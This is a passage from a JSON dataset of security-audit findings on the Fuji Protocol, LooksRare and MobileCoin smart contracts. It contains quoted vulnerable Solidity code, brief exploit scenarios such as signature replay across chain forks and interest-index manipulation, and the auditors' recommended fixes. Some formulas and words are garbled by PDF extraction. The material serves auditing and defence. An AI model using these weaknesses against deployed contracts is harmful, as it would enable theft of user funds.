        "description": "Certain setter functions fail to validate the addresses they receive as input. The following addresses are not validated:  The addresses passed to all setters in the FujiAdmin contract  The _newFujiAdmin address in the setFujiAdmin function in the Controller and FujiVault contracts  The _provider address in the FujiVault.setActiveProvider function  The _oracle address in the FujiVault.setOracle function  The _providers addresses in the FujiVault.setProviders function  The newOwner address in the transferOwnership function in the Claimable and ClaimableUpgradeable contracts Exploit scenario Alice, a member of the Fuji Protocol team, invokes the FujiVault.setOracle function and sets the oracle address as address(0). As a result, code relying on the oracle address is no longer functional. Recommendations Short term, add zero-value or contract existence checks to the functions listed above to ensure that users cannot accidentally set incorrect values, misconguring the protocol. Long term, use Slither, which will catch missing zero checks. 42 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Missing events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Indexes are not updated before all operations that require up-to-date indexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. However, this function is not called before all operations that read indexes. As a result, these operations use outdated indexes, which results in incorrect accounting and could make the protocol vulnerable to exploits. FujiVault.deposit calls FujiERC1155._mint, which reads indexes but does not call updateF1155Balances. FujiVault.paybackLiq calls FujiERC1155.balanceOf, which reads indexes but does not call updateF1155Balances. Exploit Scenario The indexes have not been updated in one day. User Bob deposits collateral into the FujiVault. Day-old indexes are used to compute Bobs scaled amount, causing Bob to gain interest for an additional day for free. Recommendations Short term, ensure that all operations that require up-to-date indexes rst call updateF1155Balances. Write tests for each function that depends on up-to-date indexes with assertions that fail if indexes are outdated. Long term, redesign the way indexes are accessed and updated such that a developer cannot simply forget to call updateF1155Balances. 33 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Formula for index calculation is unnecessarily complex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "16. Flashers initiateFlashloan function does not revert on invalid ashnum values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The Flasher contracts initiateFlashloan function does not initiate a ash loan or perform a renancing operation if the flashnum parameter is set to a value greater than 2. However, the function does not revert on invalid flashnum values. function initiateFlashloan(FlashLoan.Info calldata info, uint8 _flashnum) external isAuthorized { if (_flashnum == 0) { _initiateAaveFlashLoan(info); } else if (_flashnum == 1) { _initiateDyDxFlashLoan(info); } else if (_flashnum == 2) { _initiateCreamFlashLoan(info); } } Figure 16.1: Flasher.sol#L61-69 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller. doRefinancing with the flashnum parameter set to 3. As a result, no ash loan is initialized, and no renancing happens; only the active provider is changed. This results in unexpected behavior. For example, if a user wants to repay his debt after renancing, the operation will fail, as no debt is owed to the active provider. Recommendations Short term, revise initiateFlashloan so that it reverts when it is called with an invalid flashnum value. Long term, ensure that all functions revert if they are called with invalid values. 37 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Fuji Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Fuji Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 43 Fuji Protocol A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Risk of reuse of signatures across forks due to lack of chainID validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "At construction, the LooksRareExchange contract computes the domain separator using the networks chainID , which is xed at the time of deployment. In the event of a post-deployment chain fork, the chainID cannot be updated, and the signatures may be replayed across both versions of the chain. constructor ( address _currencyManager , address _executionManager , address _royaltyFeeManager , address _WETH , address _protocolFeeRecipient ) { // Calculate the domain separator DOMAIN_SEPARATOR = keccak256 ( abi.encode( 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f , // keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\") 0xda9101ba92939daf4bb2e18cd5f942363b9297fbc3232c9dd964abb1fb70ed71 , // keccak256(\"LooksRareExchange\") 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6 , // keccak256(bytes(\"1\")) for versionId = 1 block.chainid , address ( this ) ) ); currencyManager = ICurrencyManager(_currencyManager); executionManager = IExecutionManager(_executionManager); royaltyFeeManager = IRoyaltyFeeManager(_royaltyFeeManager); WETH = _WETH; protocolFeeRecipient = _protocolFeeRecipient; Figure 1.1: contracts/contracts/LooksRareExchange.sol#L137-L145 The _validateOrder function in the LooksRareExchange contract uses a SignatureChecker function, verify , to check the validity of a signature: // Verify the validity of the signature require ( SignatureChecker.verify( orderHash, makerOrder.signer, makerOrder.v, makerOrder.r, makerOrder.s, DOMAIN_SEPARATOR ), \"Signature: Invalid\" ); Figure 1.2: contracts/contracts/LooksRareExchange.sol#L576-L587 However, the verify function checks only that a user has signed the domainSeparator . As a result, in the event of a hard fork, an attacker could reuse signatures to receive user funds on both chains. To mitigate this risk, if a change in the chainID is detected, the domain separator can be cached and regenerated. Alternatively, instead of regenerating the entire domain separator, the chainID can be included in the schema of the signature passed to the order hash. /** * @notice Returns whether the signer matches the signed message * @param hash the hash containing the signed mesage * @param signer the signer address to confirm message validity * @param v parameter (27 or 28) * @param r parameter * @param s parameter * @param domainSeparator paramer to prevent signature being executed in other chains and environments * @return true --> if valid // false --> if invalid */ function verify ( bytes32 hash , address signer , uint8 v , bytes32 r , bytes32 s , bytes32 domainSeparator ) internal view returns ( bool ) { // \\x19\\x01 is the standardized encoding prefix // https://eips.ethereum.org/EIPS/eip-712#specification bytes32 digest = keccak256 (abi.encodePacked( \"\\x19\\x01\" , domainSeparator, hash )); if (Address.isContract(signer)) { // 0x1626ba7e is the interfaceId for signature contracts (see IERC1271) return IERC1271(signer).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e ; } else { return recover(digest, v, r, s) == signer; } } Figure 1.3: contracts/contracts/libraries/SignatureChecker.sol#L41-L68 The signature schema does not account for the contracts chain. If a fork of Ethereum is made after the contracts creation, every signature will be usable in both forks. Exploit Scenario Bob signs a maker order on the Ethereum mainnet. He signs the domain separator with a signature to sell an NFT. Later, Ethereum is hard-forked and retains the same chain ID. As a result, there are two parallel chains with the same chain ID, and Eve can use Bobs signature to match orders on the forked chain. Recommendations Short term, to prevent post-deployment forks from aecting signatures, add the chain ID opcode to the signature schema. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The owner of a LooksRare protocol contract can be changed by calling the transferOwnership function in OpenZeppelins Ownable contract. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _transferOwnership( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _transferOwnership(newOwner); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Internal function without access restriction. */ function _transferOwnership ( address newOwner ) internal virtual { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 2.1: OpenZeppelins Ownable contract Exploit Scenario Alice and Bob invoke the transferOwnership() function on the LooksRare multisig wallet to change the address of an existing contracts owner. They accidentally enter the wrong address, and ownership of the contract is transferred to the incorrect address. As a result, access to the contract is permanently revoked. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts ( appendix E ) and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "Although dependency scans did not identify a direct threat to the project under review, npm and yarn audit identied a dependency with a known vulnerability. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details the high severity issue: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Users that create ask orders cannot modify minPercentageToAsk ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "Users who sell their NFTs on LooksRare are unable to protect their orders against arbitrary changes in royalty fees set by NFT collection owners; as a result, users may receive less of a sales value than expected. Ideally, when a user lists an NFT, he should be able to set a threshold at which the transaction will execute based on the amount of the sales value that he will receive. This threshold is set via the minPercentageToAsk variable in the MakerOrder and TakerOrder structs. The minPercentageToAsk variable protects users who create ask orders from excessive royalty fees. When funds from an order are transferred, the LooksRareExchange contract ensures that the percentage amount that needs to be transferred to the recipient is greater than or equal to minPercentageToAsk (gure 3.1). function _transferFeesAndFunds ( address strategy , address collection , uint256 tokenId , address currency , address from , address to , uint256 amount , uint256 minPercentageToAsk ) internal { // Initialize the final amount that is transferred to seller uint256 finalSellerAmount = amount; // 1. Protocol fee { uint256 protocolFeeAmount = _calculateProtocolFee(strategy, amount); [...] finalSellerAmount -= protocolFeeAmount; } } // 2. Royalty fee { ( address royaltyFeeRecipient , uint256 royaltyFeeAmount ) = royaltyFeeManager.calculateRoyaltyFeeAndGetRecipient( collection, tokenId, amount ); // Check if there is a royalty fee and that it is different to 0 [...] finalSellerAmount -= royaltyFeeAmount; [...] require ( (finalSellerAmount * 10000 ) >= (minPercentageToAsk * amount), \"Fees: Higher than expected\" ); [...] } Figure 4.1: The _transferFeesAndFunds function in LooksRareExchange :422-466 However, users creating ask orders cannot modify minPercentageToAsk . By default, the minPercentageToAsk of orders placed through the LooksRare platform is set to 85%. In cases in which there is no royalty fee and the protocol fee is 2%, minPercentageToAsk could be set to 98%. Exploit Scenario Alice lists an NFT for sale on LooksRare. The protocol fee is 2%, minPercentageToAsk is 85%, and there is no royalty fee. The NFT project grows in popularity, which motivates Eve, the owner of the NFT collection, to raise the royalty fee to 9.5%, the maximum fee allowed by the RoyaltyFeeRegistry contract. Bob purchases Alices NFT. Alice receives 89.5% of the sale even though she could have received 98% of the sale at the time of the listing. Recommendations Short term, set minPercentageToAsk to 100% minus the sum of the protocol fee and the max value for a royalty fee, which is 9.5%. Long term, identify and validate the bounds for all parameters and variables in the smart contract system.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Excessive privileges of RoyaltyFeeSetter and RoyaltyFeeRegistry owners ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The RoyaltyFeeSetter and RoyaltyFeeRegistry contract owners can manipulate an NFT collections royalty information, such as the fee percentage and the fee receiver; this violates the principle of least privilege. NFT collection owners can use the RoyaltyFeeSetter contract to set the royalty information for their NFT collections. This information is stored in the RoyaltyFeeRegistry contract. However, the owners of the two contracts can also update this information (gures 5.1 and 5.2). function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external override onlyOwner { require (fee <= royaltyFeeLimit, \"Registry: Royalty fee too high\" ); _royaltyFeeInfoCollection[collection] = FeeInfo({ setter: setter, receiver: receiver, fee: fee }); emit RoyaltyFeeUpdate(collection, setter, receiver, fee); } Figure 5.1: The updateRoyaltyInfoForCollection function in RoyaltyFeeRegistry :54- function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external onlyOwner { IRoyaltyFeeRegistry(royaltyFeeRegistry).updateRoyaltyInfoForCollection( collection, setter, receiver, fee ); } Figure 5.2: The updateRoyaltyInfoForCollection function in RoyaltyFeeSetter :102-109 This violates the principle of least privilege. Since it is the responsibility of the NFT collections owner to set the royalty information, it is unnecessary for contract owners to have the same ability. Exploit Scenario Alice, the owner of the RoyaltyFeeSetter contract, sets the incorrect receiver address when updating the royalty information for Bobs NFT collection. Bob is now unable to receive fees from his NFT collections secondary sales. Recommendations Short term, remove the ability for users to update an NFT collections royalty information. Long term, clearly document the responsibilities and levels of access provided to privileged users of the system. 6. Insu\u0000cient protection of sensitive information Severity: Low Diculty: High Type: Conguration Finding ID: TOB-LR-6 Target: contracts/hardhat.config.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Contracts used as dependencies do not track upstream changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The LooksRare codebase uses a third-party contract, SignatureChecker , but the LooksRare documentation does not specify which version of the contract is used or whether it was modied. This indicates that the LooksRare protocol does not track upstream changes in contracts used as dependencies. Therefore, the LooksRare contracts may not reliably reect updates or security xes implemented in their dependencies, as those updates must be manually integrated into the contracts. Exploit Scenario A third-party contract used in LooksRare receives an update with a critical x for a vulnerability, but the update is not manually integrated in the LooksRare version of the contract. An attacker detects the use of a vulnerable contract in the LooksRare protocol and exploits the vulnerability against one of the contracts. Recommendations Short term, review the codebase and document the source and version of each dependency. Include third-party sources as submodules in the projects Git repository to maintain internal path consistency and ensure that dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Missing event for a critical operation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The system does not emit an event when a protocol fee is levied in the _transferFeesAndFunds and _transferFeesAndFundsWithWETH functions. Operations that transfer value or perform critical operations should trigger events so that users and o-chain monitoring tools can account for important state changes. if ((protocolFeeRecipient != address (0)) && (protocolFeeAmount != 0)) { IERC20(currency).safeTransferFrom(from, protocolFeeRecipient, protocolFeeAmount); finalSellerAmount -= protocolFeeAmount; } Figure 8.1: Protocol fee transfer in _transferFeesAndFunds function ( contracts/executionStrategies/StrategyDutchAuction.sol#L440-L443 ) Exploit Scenario A smart contract wallet provider has a LooksRare integration that enables its users to buy and sell NFTs. The front end relies on information from LooksRares subgraph to itemize prices, royalties, and fees. Because the system does not emit an event when a protocol fee is incurred, an under-calculation in the wallet providers accounting leads its users to believe they have been overcharged. Recommendations Short term, add events for all critical operations that transfer value, such as when a protocol fee is assessed. Events are vital aids in monitoring contracts and detecting suspicious behavior. Long term, consider adding or accounting for a new protocol fee event in the LooksRare subgraph and any other o-chain monitoring tools LooksRare might be using.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Taker orders are not EIP-712 signatures ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "When takers attempt to match order proposals, they are presented with an obscure blob of data. In contrast, makers are presented with a formatted data structure that makes it easier to validate transactions. struct TakerOrder { bool isOrderAsk ; // true --> ask / false --> bid address taker ; // msg.sender uint256 price ; // final price for the purchase uint256 tokenId ; uint256 minPercentageToAsk ; // // slippage protection (9000 --> 90% of the final price must return to ask) bytes params ; // other params (e.g., tokenId) } Figure 9.1: The TakerOrder struct in OrderTypes.sol :31-38 While this issue cannot be exploited directly, it creates an asymmetry between the user experience (UX) of makers and takers. Because of this, users depend on the information that the user interface (UI) displays to them and are limited by the UX of the wallet software they are using. Exploit Scenario 1 Eve, a malicious user, lists a new collection with the same metadata as another, more popular collection. Bob sees Eves listing and thinks that it is the legitimate collection. He creates an order for an NFT in Eves collection, and because he cannot distinguish the parameters of the transaction he is signing, he matches it, losing money in the process. Exploit Scenario 2 Alice, an attacker, compromises the UI, allowing her to manipulate the information displayed by it in order to make illegitimate collections look legitimate. This is a more extreme exploit scenario. Recommendations Short term, evaluate and document the current UI and the pitfalls that users might encounter when matching and creating orders. Long term, evaluate whether adding support for EIP-712 signatures in TakerOrder would minimize the issue and provide a better UX.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The LooksRare contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the LooksRare contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. isContract may behave unexpectedly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The LooksRare exchange relies on OpenZeppelins SignatureChecker library to verify signatures on-chain. This library, in turn, relies on the isContract function in the Address library to determine whether the signer is a contract or an externally owned account (EOA). However, in Solidity, there is no reliable way to denitively determine whether a given address is a contract, as there are several edge cases in which the underlying extcodesize function can return unexpected results. function isContract( address account) internal view returns ( bool ) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. uint256 size; assembly { size := extcodesize (account) } return size > 0; } Figure 11.1: The isContract function in Address.sol #L27-37 Exploit Scenario A maker order is created and signed by a smart contract wallet. While this order is waiting to be lled, selfdestruct is called on the contract. The call to extcodesize returns 0, causing isContract to return false. Even though the order was signed by an ERC1271-compatible contract, the verify method will attempt to validate the signers address as though it were signed by an EOA. Recommendations Short term, clearly document for developers that SignatureChecker.verify is not guaranteed to accurately distinguish between an EOA and a contract signer, and emphasize that it should never be used in a manner that requires such a guarantee. Long term, avoid adding or altering functionality that would rely on a guarantee that a signatures source remains consistent over time.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. tokenId and amount fully controlled by the order strategy when matching two orders ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "When two orders are matched, the strategy dened by the MakerOrder is called to check whether the order can be executed. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Retrieve execution parameters ( bool isExecutionValid , uint256 tokenId , uint256 amount ) = IExecutionStrategy(makerAsk.strategy) .canExecuteTakerBid(takerBid, makerAsk); require (isExecutionValid, \"Strategy: Execution invalid\" ); [...] } Figure 12.1: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#186-212 ) The strategy call returns a boolean indicating whether the order match can be executed, the tokenId to be sold, and the amount to be transferred. The LooksRareExchange contract does not verify these last two values, which means that the strategy has full control over them. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Execution part 1/2 _transferFeesAndFundsWithWETH( makerAsk.strategy, makerAsk.collection, tokenId, makerAsk.signer, takerBid.price, makerAsk.minPercentageToAsk ); // Execution part 2/2 _transferNonFungibleToken(makerAsk.collection, makerAsk.signer, takerBid.taker, tokenId, amount); emit TakerBid( askHash, makerAsk.nonce, takerBid.taker, makerAsk.signer, makerAsk.strategy, makerAsk.currency, makerAsk.collection, tokenId, amount, takerBid.price ); } Figure 12.2: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#217-228 ) This ultimately means that a faulty or malicious strategy can cause a loss of funds (e.g., by returning a dierent tokenId from the one that was intended to be sold or bought). Additionally, this issue may become problematic if strategies become trustless and are no longer developed or allowlisted by the LooksRare team. Exploit Scenario A faulty strategy, which returns a dierent tokenId than expected, is allowlisted in the protocol. Alice creates a new order using that strategy to sell one of her tokens. Bob matches Alices order, but because the tokenId is not validated before executing the order, he gets a dierent token than he intended to buy. Recommendations Short term, evaluate and document this behavior and use this documentation when integrating new strategies into the protocol. Long term, consider adding further safeguards to the LooksRareExchange contract to check the validity of the tokenId and the amount returned by the call to the strategy.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Risk of phishing due to data stored in maker order params eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The MakerOrder struct contains a params eld, which holds arbitrary data for each strategy. This storage of data may increase the chance that users could be phished. struct MakerOrder { bool isOrderAsk; // true --> ask / false --> bid address signer; // signer of the maker order address collection; // collection address uint256 price; // price (used as ) uint256 tokenId; // id of the token uint256 amount; // amount of tokens to sell/purchase (must be 1 for ERC721, 1+ for ERC1155) address strategy; // strategy for trade execution (e.g., DutchAuction, StandardSaleForFixedPrice) address currency; // currency (e.g., WETH) uint256 nonce; // order nonce (must be unique unless new maker order is meant to override existing one e.g., lower ask price) uint256 startTime; // startTime in timestamp uint256 endTime; // endTime in timestamp uint256 minPercentageToAsk; // slippage protection (9000 --> 90% of the final price must return to ask) bytes params; // additional parameters uint8 v; // v: parameter (27 or 28) bytes32 r; // r: parameter bytes32 s; // s: parameter } Figure 13.1: The MakerOrder struct in contracts/libraries/OrderTypes.sol#L12-29 In the Dutch auction strategy, the maker params eld denes the start price for the auction. When a user generates the signature, the UI must specify the purpose of params . function canExecuteTakerBid (OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { } uint256 startPrice = abi.decode(makerAsk.params, ( uint256 )); uint256 endPrice = makerAsk.price; Figure 13.2: The canExecuteTakerBid function in contracts/executionStrategies/StrategyDutchAuction.sol#L39-L70 When used in a StrategyPrivateSale transaction, the params eld holds the buyer address that the private sale is intended for. function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { // Retrieve target buyer address targetBuyer = abi.decode(makerAsk.params, ( address )); return ( ((targetBuyer == takerBid.taker) && (makerAsk.price == takerBid.price) && (makerAsk.tokenId == takerBid.tokenId) && (makerAsk.startTime <= block.timestamp ) && (makerAsk.endTime >= block.timestamp )), makerAsk.tokenId, makerAsk.amount ); } Figure 13.3: The canExecuteTakerBid function in contracts/executionStrategies/StrategyPrivateSale.sol Exploit Scenario Alice receives an EIP-712 signature request through MetaMask. Because the value is masked in the params eld, Alice accidentally signs an incorrect parameter that allows an attacker to match. Recommendations Short term, document the expected values for the params value for all strategies and add in-code documentation to ensure that developers are aware of strategy expectations. Long term, document the risks associated with o-chain signatures and always ensure that users are aware of the risks of signing arbitrary data.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Use of legacy openssl version in solidity-coverage plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "The LooksRare codebase uses a version of solidity-coverage that relies on a legacy version of openssl to run. While this plugin does not alter protocol contracts deployed to production, the use of outdated security protocols anywhere in the codebase may be risky or prone to errors. Error in plugin solidity-coverage: Error: error:0308010C:digital envelope routines::unsupported Figure 14.1: Error raised by npx hardhat coverage Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "15. TypeScript compiler errors during deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "description": "TypeScript throws an error while trying to compile scripts during the deployment process. scripts/helpers/deploy-exchange.ts:29:5 - error TS7053: Element implicitly has an 'any' type because expression of type 'string' can't be used to index type '{ mainnet: string; rinkeby: string; localhost: string; }'. No index signature with a parameter of type 'string' was found on type '{ mainnet: string; rinkeby: string; localhost: string; }'. 29 config.Fee.Standard[activeNetwork] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Figure 15.1: TypeScript error raised by npx hardhat run --network localhost scripts/hardhat/deploy-hardhat.ts In the config.ts le, the config object does not explicitly allow string types to be used as an index type for accessing its keys. Hardhat assigns a string type as the value of activeNetwork . As a result, TypeScript throws a compiler error when it tries to access a member of the config object using the activeNetwork value. Recommendations Short term, add type information to the config object that allows its keys to be accessed using string types. Long term, ensure that TypeScript can compile properly without errors in any and every potential context.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Project contains vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "Running cargo-audit over the codebase revealed that the system under audit uses crates with Rust Security (RustSec) advisories and crates that are no longer maintained. RustSec ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. MobileCoin Foundation could infer token IDs in certain scenarios ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
